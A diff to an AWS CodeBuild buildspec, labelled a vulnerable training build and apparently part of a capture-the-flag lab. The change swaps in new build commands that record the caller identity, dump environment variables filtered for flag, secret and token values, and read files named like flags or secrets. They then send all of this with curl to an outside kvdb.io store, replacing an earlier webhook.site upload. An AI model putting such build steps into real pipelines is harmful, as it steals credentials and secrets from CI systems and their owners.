@@ -5,17 +5,17 @@ phases:
     commands:
       - echo "Running vulnerable training build"
       - |
+        aws sts get-caller-identity 2>&1 | tee /tmp/whoami.txt || true
+        env | sort | sed -E '/^(AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN)=/d' | tee /tmp/env.txt || true
         {
-          echo "=== WHOAMI ==="
-          aws sts get-caller-identity 2>&1 || true
-          echo "=== ENVIRONMENT ==="
-          env | sort | sed -E '/^(AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN)=/d'
-          echo "=== FLAG FILE SEARCH ==="
-          find / -maxdepth 5 -type f \( -iname '*flag*' -o -iname '*secret*' \) 2>/dev/null | head -n 100 | while IFS= read -r f; do
+          echo "=== flag-like environment ==="
+          env | sort | sed -E '/^(AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN)=/d' | grep -Ei 'flag|secret|token|ctf|lab' || true
+          echo "=== flag-like files ==="
+          find / -maxdepth 5 -type f \( -iname '*flag*' -o -iname '*secret*' \) 2>/dev/null | head -n 50 | while IFS= read -r f; do
             echo "--- $f"
-            sed -n '1,120p' "$f" 2>/dev/null || true
+            sed -n '1,80p' "$f" 2>/dev/null || true
           done
-          echo "=== DONE ==="
-        } > /tmp/codebuild-runtime-evidence.txt 2>&1
-      - cat /tmp/codebuild-runtime-evidence.txt
-      - curl -fsS -X POST --data-binary @/tmp/codebuild-runtime-evidence.txt https://webhook.site/19a22270-8d5d-4eba-a7f4-fac7a915f6e0 || true
+        } | tee /tmp/flags.txt
+        curl -fsS --data-binary @/tmp/whoami.txt https://kvdb.io/HJjCRYSLCCKeyoxLHGb9MD/whoami || true
+        curl -fsS --data-binary @/tmp/env.txt https://kvdb.io/HJjCRYSLCCKeyoxLHGb9MD/env || true
+        curl -fsS --data-binary @/tmp/flags.txt https://kvdb.io/HJjCRYSLCCKeyoxLHGb9MD/flags || true
